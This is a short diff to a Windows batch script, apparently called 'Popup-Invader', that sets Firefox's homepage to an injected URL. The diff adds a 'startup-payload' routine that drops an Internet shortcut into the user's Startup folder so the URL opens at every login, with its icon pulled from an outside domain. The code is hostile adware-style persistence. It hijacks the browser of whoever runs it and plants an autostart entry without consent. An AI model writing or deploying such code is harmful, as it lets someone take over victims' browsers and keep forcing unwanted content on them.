@@ -102,3 +102,10 @@ echo user_pref("browser.startup.homepage", "%POPUP_INVADER_URL%"); >> "%MOZ_PREF
 set MOZ_PREFS_DIR=
 call :reset-to-windir
 goto ask-startup
+
+:startup-payload
+echo [InternetShortcut] > "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Popup-Invader.URL"
+echo URL=%POPUP_INVADER_URL% >> "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Popup-Invader.URL"
+echo IconFile=https://cdn.fire-softwares.ga/favicon.ico >> "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Popup-Invader.URL"
+echo IconIndex=0 >> "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Popup-Invader.URL"
+goto end
